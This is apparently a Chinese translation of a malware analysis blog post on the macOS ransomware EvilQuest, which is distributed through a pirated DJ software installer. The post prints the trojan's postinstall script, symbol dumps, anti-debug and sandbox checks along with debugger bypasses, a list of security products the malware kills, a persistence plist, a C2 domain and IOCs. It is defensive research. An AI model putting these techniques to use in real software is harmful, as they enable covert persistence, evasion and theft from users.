# 交钱解密了还远控？新型MacOS勒索EvilQuest正在传播

阅读量 **315730**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-07-03 16:30:48

 **x**

##### 译文声明

本文是翻译文章，文章原作者 Patrick Wardle，文章来源：objective-see.com

原文地址：<https://objective-see.com/blog/blog_0x59.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t018e881c710e272c14.jpg)

## 背景

今天早些时候，[著名的](https://twitter.com/dineshdina04)恶意软件研究人员[Dinesh
Devadoss](https://twitter.com/dineshdina04)在推特上发布了一篇关于MacOS勒索软件的新推文，表示这是一种冒充Google软件更新程序的新型恶意软件。

![](https://p0.ssl.qhimg.com/t01f3a56b5fc112655c.png)

MacOS平台的勒索比较少，但在此新型勒索开始出现时，[RansomWhere](https://objective-see.com/products/ransomwhere.html)表示他们可以很好的进行检测。所以我也准备分析分析该勒索，并且看看我的工具能够检测该勒索软件。

## 感染载体

从Dinesh的[推文中](https://twitter.com/dineshdina04/status/1277668001538433025)还暂时看不出来该勒索软件是如何感染macOS用户的。但是Malwarebytes的[Thomas
Reed](https://twitter.com/thomasareed?lang=en)指出该恶意软件是在流行torrent网站上共享的盗版macOS软件中发现的。

这是一种非常常见但是并不复杂的感染方式，目前有很多恶意软件都是通过这种方式进行传播。macOS恶意软件通过Torrent感染传播的其他示例包括：

[OSX.iWorm](https://www.virusbulletin.com/uploads/pdf/magazine/2014/vb201410-iWorm.pdf):

![](https://objective-see.com/images/blog/blog_0x59/iWorm.png)

[OSX.Shlayer](https://www.intego.com/mac-security-blog/osxshlayer-new-mac-malware-comes-out-of-its-shell/):

Intego研究人员发现OSX /
Shlayer通过BitTorrent文件共享站点传播，当用户尝试选择链接来复制torrent磁铁链接时，它显示为伪造的Flash Player更新。

我们今天将要分析的样本打包在流行的DJ软件[Mixed In Key](https://mixedinkey.com/)(盗版)中，恶意软件未签名：

![](https://objective-see.com/images/blog/blog_0x59/unsigned.png)

这意味着该软件在运行前MacOS将会弹框以获得用户的允许：

![](https://objective-see.com/images/blog/blog_0x59/warning.png)

但是，使用盗版软件的macOS用户可能会忽略此警告并继续运行导致mac被感染。

## 分析

和上面讲的一样，该勒索软件是通过木马安装程序分发的。我们将深入研究的样本是通过名为Mixed In Key 8.dmg（SHA1:
98040c4d358a6fb9fed970df283a9b25f0ab393b）的磁盘映像分发的。

当前，该磁盘映像尚未由[VirusTotal](https://www.virustotal.com/gui/file/b34738e181a6119f23e930476ae949fc0c7c4ded6efa003019fa946c4e5b287a/detection)上的任何防病毒引擎标记（尽管随着AV引擎更新其签名数据库，这可能会更改

![](https://objective-see.com/images/blog/blog_0x59/vt.png)

我们可以通过hdiutil挂载该磁盘映像：

    
    
    $ hdiutil attach ~/Downloads/Mixed In Key 8.dmg 
    /dev/disk2            GUID_partition_scheme           
    /dev/disk2s1          Apple_APFS                      
    /dev/disk3            EF57347C-0000-11AA-AA11-0030654 
    /dev/disk3s1          41504653-0000-11AA-AA11-0030654 /Volumes/Mixed In Key 8
    

挂载的磁盘映像（’/ Volumes / Mixed In Key 8 /‘）包含一个安装程序包Mixed In Key 8.pkg：

    
    
    $ ls /Volumes/Mixed In Key 8/
    Mixed In Key 8.pkg
    

我最喜欢的用于静态分析软件包（并从中提取文件）的工具是[Suspicious
Package](https://mothersruin.com/software/SuspiciousPackage/)

![](https://objective-see.com/images/blog/blog_0x59/open.png)

在使用Suspicious Package加载恶意软件之后，我们找到了（盗版的）Mixed In Key 8应用程序和名为”patch”的二进制文件：

![](https://objective-see.com/images/blog/blog_0x59/files.png)

单击“安装”选项卡后，我们找到安装后脚本：

    
    
    #!/bin/sh
    mkdir /Library/mixednkey
    
    mv /Applications/Utils/patch /Library/mixednkey/toolroomd
    rmdir /Application/Utils
    
    chmod +x /Library/mixednkey/toolroomd
    
    /Library/mixednkey/toolroomd &
    

很明显 ,在创建/Library/mixednkey目录后，程序会将一个二进制文件patch移动到该目录中，将其设置为可执行文件，然后启动它。

当安装程序在安装过程中请求root特权时，此脚本（以及toolroomd二进制文件）也将以root特权运行：

![](https://objective-see.com/images/blog/blog_0x59/install.png)

使用Suspicious Package我们可以同时对Mixed In Key 8应用程序和名为patch的二进制文件进行分析。由于Mixed In Key
8二进制文件仍然包含了开发人员的有效签名，因此它很可能是原始的且未经修改：

![](https://objective-see.com/images/blog/blog_0x59/signed.png)

因此，我们将注意力转向toolroomd二进制文件。

toolroomd（原名为patch）是一个Mach-O格式的64位可执行应用程序。

    
    
    $ file patch
    patch: Mach-O 64-bit executable x86_64
    
    $ codesign -dvv patch 
    patch: code object is not signed at all
    
    $ shasum -a1 patch
    efbb681a61967e6f5a811f8649ec26efe16f50ae  patch
    

接下来，我们通过strings命令获取该应用程序的字符串：

    
    
    $ string - patch
    
    2Uy5DI3hMp7o0cq|T|14vHRz0000013
    0ZPKhq0rEeUJ0GhPle1joWN30000033
    0rzACG3Wr||n1dHnZL17MbWe0000013
    
    system.privilege.admin
    
    %s --reroot
    --silent
    --noroot
    --ignrp
    
    _generate_xkey
    
    /toidievitceffe/libtpyrc/tpyrc.c
    bits <= 1024
    
    _get_process_list
    /toidievitceffe/libpersist/persist.c
    
    
    [return]
    [tab]
    [del]
    [esc]
    [right-cmd]
    [left-cmd]
    [left-shift]
    [caps]
    [left-option]
    

从strings输出中，我们找到了一些混淆的字符串、一些命令行参数，加密关键字和与keylogging相关的字符串。

通过nm指令，我们可以转储符号的名称（包括函数名称）：

    
    
    nm patch
                     U _CGEventGetIntegerValueField
                     U _CGEventTapCreate
                     U _CGEventTapEnable
    
                     U _NSAddressOfSymbol
                     U _NSCreateObjectFileImageFromMemory
                     U _NSDestroyObjectFileImage
                     U _NSLinkModule
                     U _NSLookupSymbolInModule
                     U _NSUnLinkModule
                     U _NXFindBestFatArch
    
    0000000100002900 T __construct_plist_path
    000000010000a7e0 T __dispatch
    0000000100009c20 T __ei_init_crc32_tab
    000000010000b490 T __ei_rootgainer_elevate
    00000001000061c0 T __generate_xkey
    000000010000a550 T __get_host_identifier
    0000000100007c40 T __get_process_list
    00000001000094d0 T __home_stub
    000000010000e0c0 T __is_target
    000000010000ecb0 T __make_temp_name
    0000000100000000 T __mh_execute_header
    0000000100004910 T __pack_trailer
    000000010000a170 T __react_exec
    000000010000a160 T __react_host
    000000010000a470 T __react_keys
    000000010000a500 T __react_ping
    000000010000a300 T __react_save
    0000000100009e80 T __react_scmd
    000000010000a460 T __react_start
    00000001000072d0 T __rotate
    00000001000068a0 T __tp_decrypt
    0000000100006610 T __tp_encrypt
    00000001000049c0 T __unpack_trailer
    0000000100002550 T _acquire_root
    
                     U _connect
    00000001000085a0 T _create_rescue_executable
    000000010000ba50 T _ei_carver_main
    0000000100001590 T _ei_forensic_sendfile
    0000000100001680 T _ei_forensic_thread
    0000000100005b00 T _ei_get_host_info
    0000000100006050 T _ei_get_macaddr
    000000010000b9b0 T _ei_loader_main
    000000010000c9a0 T _ei_loader_thread
    0000000100009650 T _ei_pers_thread
    000000010000b880 T _ei_persistence_main
    0000000100001c30 T _ei_read_spot
    000000010000b580 T _ei_rootgainer_main
    0000000100003670 T _ei_run_file
    0000000100003790 T _ei_run_memory_hrd
    0000000100009550 T _ei_run_thread
    0000000100001a10 T _ei_save_spot
    000000010000b710 T _ei_selfretain_main
    
    000000010000de60 T _eib_decode
    000000010000dd40 T _eib_encode
    000000010000dc40 T _eib_pack_c
    000000010000e010 T _eib_secure_decode
    000000010000dfa0 T _eib_secure_encode
    0000000100013660 D _eib_string_fa
    0000000100013708 S _eib_string_key
    000000010000dcb0 T _eib_unpack_i
    
    0000000100007570 T _eip_decrypt
    0000000100007310 T _eip_encrypt
    0000000100007130 T _eip_key
    00000001000071f0 T _eip_seeds
    
    
    0000000100007aa0 T _is_debugging
    0000000100007bc0 T _is_virtual_mchn
    
    0000000100002dd0 T _lfsc_dirlist
    00000001000032c0 T _lfsc_get_contents
    000000010000fa50 T _lfsc_match
    00000001000033e0 T _lfsc_pack_binary
    000000010000f720 T _lfsc_parse_template
    0000000100003500 T _lfsc_unpack_binary
    
    
    0000000100008810 T _persist_executable
    0000000100008df0 T _persist_executable_frombundle
                     U _popen
    0000000100007c20 T _prevent_trace
    

拨云雾而见青天，通过nm的输出，我们看到了与以下内容相关的方法和函数名：

    
    
    1. keylogging相关，如_CGEventTapCreate、_CGEventTapEnable等。
    2. 内存代码执行相关，如_NSCreateObjectFileImageFromMemory、_NSLinkModule等。
    3. 反调试相关，如_is_debugging、_is_virtual_mchn等。
    4. 反检测相关，如__get_host_identifier、__get_process_list等。
    5. 本地持久化，如_persist_executable、_persist_executable_frombundle等。
    6. 加密，勒索相关，如_eip_encrypt。
    

这似乎并不是一个”简单的勒索软件”

该对patch程序进行调试了。

toolroomd(patch)二进制文件的核心逻辑发生在其主要功能内。

在检查了各种命令行参数（—silent，—noroot和—ignrp）之后，它执行一个名为is_virtual_mchn的函数，如果返回true则退出：

    
    
    if(is_virtual_mchn(0x2) != 0x0) {
        exit();
    }
    

让我们仔细分析一下这个函数，因为我们要使其不检测虚拟机中的调试会话：

    
    
     int _is_virtual_mchn(int arg0) {
         var_10 = time();
         sleep(argO);
         rax = time();
         rdx = 0x0;
         if (rax - var_10 < arg0) {
                 rdx = 0x1;
         }
         rax = rdx;
        return rax;
    }
    

该代码调用time两次，中间插入一个sleep……然后比较两个调用之间的差异是否与time系统睡眠的时间相匹配。通过这种方式就可以判断patch是否运行在沙箱中：

>
> 睡眠修补程序沙盒将修补睡眠功能，以试图克服使用时间延迟的恶意软件。作为响应，恶意软件将检查时间是否已加速。恶意软件将获取时间戳，进入睡眠状态，然后在唤醒时再次获取时间戳。时间戳记之间的时间差应与恶意软件被编程为休眠的时间长度相同。如果不是，则该恶意软件会知道它正在修补睡眠功能的环境中运行，这只会在沙箱中发生

这意味着，实际上，该功能更多是沙箱检查，并且可能无法检测到虚拟机。对于我们的调试工作而言，这是个好消息！

接下来，该恶意软件调用了一个名为extract_ei的方法，该方法尝试从自身的尾部读取0x20字节的数据，但是，由于unpack_trailer（由extract_ei调用）函数在对0DEADFACEh检查的时候返回了false。因此该样本中似乎并不存在符合的尾部数据。

    
    
    ;rcx: trailer data
    __text:0000000100004A39                 cmp     dword ptr [rcx+8], 0DEADFACEh
    __text:0000000100004A40                 mov     [rbp+var_38], rax
    __text:0000000100004A44                 jz      leave
    

在没有找到预定义数据的情况下，该样本跳过了某些持久性逻辑……看起来像是在保留一个守护程序的逻辑：

    
    
    ;rcx: trailer data
     if (extract_ei(*var_10, &var_40) != 0x0) {
         _persist_executable_frombundle(var_48, var_40, var_30, *var_10);
         _install_daemon(var_30, _ei_str("0hC|h71FgtPJ32afft3EzOyU3xFA7q0{LBx..."), 
                         _ei_str("0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD..."), 0x1);
    
         var_50 = _ei_str("0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD1m6d3j0000073");
         var_58 = _ei_str("20HBC332gdTh2WTNhS2CgFnL2WBs2l26jxCi0000013");
         var_60 = _ei_str("1PbP8y2Bxfxk0000013");
        ...
        _run_daemon_u(var_50, var_58, var_60);
        ...
        _run_target(*var_10);
    }
    

程序混淆了我们感兴趣的各种值（例如守护程序的名称/路径）。但是，看起来_ei_str函数负责去模糊处理：

查看它的反编译，我们看到一个名为_eib_string_key的变量的一次性初始化，然后调用名为_eib_secure_decode的函数（它调用了名为_tpdcrypt的方法）：

    
    
     int _ei_str(int arg0) {
         var_10 = arg0;
         if (*_eib_string_key == 0x0) {
                 *_eib_string_key = _eip_decrypt(_eib_string_fa, 0x6b8b4567);
         }
         var_18 = 0x0;
         rax = strlen();
         rax = _eib_secure_decode(var_10, rax, *_eib_string_key, &var_18);
         var_20 = rax;
        if (var_20 == 0x0) {
                var_8 = var_10;
        }
        else {
                var_8 = var_20;
        }
        rax = var_8;
        return rax;
    }
    

通常，我们不必担心去混淆（或解密）算法的细节，因为我们可以简单地在函数末尾设置调试器断点，并打印出纯文本字符串(通常解密之后的值会存放在eax中)。

但是至少让我们转储解密密钥（_eib_string_key）：

    
    
    (lldb) x/s $rdx
    0x1001004c0: "PPK76!dfa82^g"
    

由于该样本貌似不包含预定义的数据，因此将跳过此特定代码块……但是，该恶意软件随后调用了一个名为_ei_persistence_main（也可以持久化该恶意软件）的函数。

在执行在持久化之前操作之前，_ei_persistence_main会执行各种反调试操作以防止动态调试。具体来说，它首先调用一个名为is_debugging的函数。is_debugging方法在地址0000000100007AA0处实现。此外，程序还通过CTL_KERN、KERN_PROC、KERN_PROC_PID和getpid（）等函数判断是否在调试环境中。一旦获取到返回，程序将检查P_TRACED
是否被设置，这是一种很常见的反调试检测思路。

![](https://objective-see.com/images/blog/blog_0x59/antiDebug.png)

如果is_debugging函数返回1（true），则恶意软件将退出：

    
    
    __text:000000010000B89A                 call    _is_debugging
    __text:000000010000B89F                 cmp     eax, 0
    __text:000000010000B8A2                 jz      continue
    __text:000000010000B8A8                 mov     edi, 1
    __text:000000010000B8AD                 call    _exit
    

想要在调试器中绕过它，我们只需要在0x000000010000B89F处设置断点，然后将RAX寄存器的值更改为0（false）：

    
    
    * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    ->  0x10000b89f: cmpl   $0x0, %eax
        0x10000b8a2: je     0x10000b8b2
        0x10000b8a8: movl   $0x1, %edi
        0x10000b8ad: callq  0x10000feb2
    Target 0: (patch) stopped.
    
    (lldb) reg read $rax
         rax = 0x0000000000000001
    (lldb) reg write $rax 0
    (lldb) c
    

但是！该恶意软件的反调试不止这一处，程序还通过_prevent_trace函数进行反调试检测：

    
    
     __text:0000000100007C20 _prevent_trace  proc near   
     __text:0000000100007C20                 push    rbp
     __text:0000000100007C21                 mov     rbp, rsp
     __text:0000000100007C24                 call    _getpid
     __text:0000000100007C29                 xor     ecx, ecx
     __text:0000000100007C2B                 mov     edx, ecx        ; addr
     __text:0000000100007C2D                 xor     ecx, ecx        ; data
     __text:0000000100007C2F                 mov     edi, 1Fh        ; request
     __text:0000000100007C34                 mov     esi, eax        ; pid
    __text:0000000100007C36                 call    _ptrace
    __text:0000000100007C3B                 pop     rbp
    __text:0000000100007C3C                 retn
    __text:0000000100007C3C _prevent_trace  endp
    

要绕过这一点，我们只需避免调用_prevent_trace,我们可以在调用这个函数时设置一个断点，然后修改指令指针（RIP）的值跳过它！

    
    
    (lldb) b 0x000000010000B8B2
    Breakpoint 12: where = patch`patch[0x000000010000b8b2], address = 0x000000010000b8b2
    (lldb) c
    Process 683 resuming
    Process 683 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1
    
    ->  0x10000b8b2: callq  0x100007c20
        0x10000b8b7: leaq   0x7de2(%rip), %rdi
        0x10000b8be: movl   $0x8, %esi
        0x10000b8c3: movl   %eax, -0x38(%rbp)
    Target 0: (patch) stopped.
    
    (lldb) reg write $rip 0x10000b8b7
    (lldb) c
    

十分简单！现在，我们可以不受干扰地继续进行动态分析。

顾名思义,ei_persistence_main可实现恶意软件的持久化，但是，在进行持久化之前，它会调用一个名为kill_unwanted杀死所有可能检测或阻止恶意行为的知名安全产品的函数。

kill_unwanted函数获取正在运行的进程的列表，将每个进程与“不需要的”程序的加密列表进行比较。使用前面提到的ei_str函数断点，我们可以转储解密的字符串，以确定“不需要的”程序的值：

    
    
    (lldb) x/s $rax
    0x100108fd0: "Little Snitch"
    
    (lldb) x/s $rax
    0x100100880: "Kaspersky"
    
    (lldb) x/s $rax
    0x1001028a0: "Norton"
    
    (lldb) x/s $rax
    0x10010a2f0: "Avast"
    
    (lldb) x/s $rax
    0x10010a300: "DrWeb"
    
    (lldb) x/s $rax
    0x100102eb0: "Mcaffee"
    
    (lldb) x/s $rax
    0x100109d20: "Bitdefender"
    
    (lldb) x/s $rax
    0x100109d30: "Bullguard"
    

我相信有一天，Objective-See的工具会列出这样的清单！哈哈！

最终，ei_persistence_main执行，成功实现恶意软件的本地持久化。我们可以通过文件监视器和/或在调试器中观察到这一点。

首先，我们观察到恶意软件解密了与持久性相关的各种字符串：

    
    
    (lldb) x/s $rax
    0x100118fd0: "/Library/AppQuest/com.apple.questd"
    
    (lldb) x/s $rax
    0x1001190f0: "%s/Library/AppQuest/com.apple.questd"
    

文件监视器（例如macOS的fs_usage）显示了恶意软件向其写入二进制文件~/Library/AppQuest/com.apple.questd，然后创建启动代理属性列表以保留该二进制文件：

    
    
    # fs_usage -w -f filesystem
    open ~/Library/AppQuest/com.apple.questd
    
    ...
    
    chmod  ~/Library/AppQuest/com.apple.questd       
    
    ...
    
    WrData[A]  ~/Library/LaunchAgents/com.apple.questd.plist
    

com.apple.questd只是恶意软件的一个副本，我们可以通过com.apple.questd.plist的内容发现一些有趣的东西：

    
    
    x/s $rax
    0x100119540: "<?xml version="1.0" encoding="UTF-8"?>n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">n<plist version="1.0">n<dict>n<key>Label</key>n<string>%s</string>nn<key>ProgramArguments</key>n<array>n<string>%s</string>n<string>--silent</string>n</array>nn<key>RunAtLoad</key>n<true/>nn<key>KeepAlive</key>n<true/>nn</dict>n</plist>"
    

比如填充com.apple.questd二进制文件的完整路径：

    
    
    cat /Users/user/Library/LaunchAgents/com.apple.questd.plist 
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
    <key>Label</key>
    <string>questd</string>
    
    <key>ProgramArguments</key>
    <array>
    <string>/Users/user/Library/AppQuest/com.apple.questd</string>
    <string>--silent</string>
    </array>
    
    <key>RunAtLoad</key>
    <true/>
    
    <key>KeepAlive</key>
    <true/>
    
    </dict>
    

由于RunAtLoad密钥设置为true恶意软件（现在称为com.apple.questd），因此每次用户登录时都会自动重新启动。

当然[BlockBlock](https://objective-see.com/products/blockblock.html)会检测到这种持久性尝试

![](https://objective-see.com/images/blog/blog_0x59/blockblock.png)

一旦确定恶意软件能够持久存在，它似乎就会对其进行复制（复制到~/Library/.9W4S5dtNK，并附带一个预定义数据：

![](https://objective-see.com/images/blog/blog_0x59/trailer.png)

通过流程监视器，我们可以观察到恶意软件，然后通过launchctl submit -l 命令启动此副本：

    
    
    [procInfo] process start:
    pid: 737
    path: /bin/launchctl
    user: 501
    args: (
        launchctl,
        submit,
        "-l",
        questd,
        "-p",
        "/Users/user/Library/.9W4S5dtNK"
    )
    
    
    [procInfo] process start:
    pid: 738
    path: /Users/user/Library/.9W4S5dtNK
    user: 0
    ...
    

注意：

该恶意软件也可能会继续存在于/ Library / mixnkey / toolroomd

因此，现在该恶意软件已经持久存在并启动了自身的新配置（即带有“trailer”数据）实例。现在样本可以实现很多功能了：

首先，它将开始加密用户的文件。具体来说，它调用一个名为carve_target的函数，该函数通过eip_encrypt对文件进行加密。文件加密完成后，它将创建一个文本文件，名称READ_ME_NOW为勒索提示我文件：

![](https://objective-see.com/images/blog/blog_0x59/readMe.png)

为确保用户读取此文件，它显示以下模式提示符，并通过macOS内置的“语音”功能大声朗读它：

![](https://objective-see.com/images/blog/blog_0x59/instructions.png)

幸运的是[RansomWhere](https://objective-see.com/products/RansomWhere.html)可以检测到该勒索病毒。

![](https://objective-see.com/images/blog/blog_0x59/ransomwhere.png)

该恶意软件还会查找一些有趣的文件，例如

“wallet.pdf”

“wallet.png”

“key.png”

“*.p12”

此外，它还调用一个名为eilf _rglk_watch_ 的函数，通过CGEventTapCreate Apple API启动一个键盘记录器。

另外，一个名为dispatch（位于address
0x000000010000A7E0）的函数似乎可以处理来自命令和控制服务器（andrewka6.pythonanywhere.com）的任务。这些任务包括：

    
    
    1. 执行命令
    2. 启动键盘记录器
    3. 直接在内存中执行模块
    

最后，如果满足某些先决条件，恶意软件也可能尝试创建反向shell。

有了这些功能，攻击者就可以完全控制受感染的主机！

## 结论

今天，我们对一个有趣的新恶意软件进行了分析-详细介绍了其持久性和功能。

尽管是新的，但我们的（免费！）工具，例如[BlockBlock](https://objective-see.com/products/blockblock.html)和[RansomWhere](https://objective-see.com/products/ransomwhere.html)能够在没有分析的情况下检测并阻止此类的攻击。

![](https://objective-see.com/images/blog/blog_0x59/blockblock.png)

![](https://objective-see.com/images/blog/blog_0x59/ransomwhere.png)

## IOC

/Library/mixednkey/toolroomd  
~/Library/AppQuest/com.apple.questd  
~/Library/LaunchAgents/com.apple.questd.plist

本文翻译自objective-see.com [原文链接](https://objective-see.com/blog/blog_0x59.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **jux1a** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/209530](/post/id/209530)

安全客 - 有思想的安全新媒体

本文转载自: [objective-see.com](https://objective-see.com/blog/blog_0x59.html)

如若转载,请注明出处： <https://objective-see.com/blog/blog_0x59.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [macOS](/tag/macOS)
  * [恶意活动](/tag/恶意活动)
  * [EvilQuest](/tag/EvilQuest)

 **+1** __2赞

 __收藏

![](https://p4.ssl.qhimg.com/t01c900f6a705a10464.png) jux1a

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

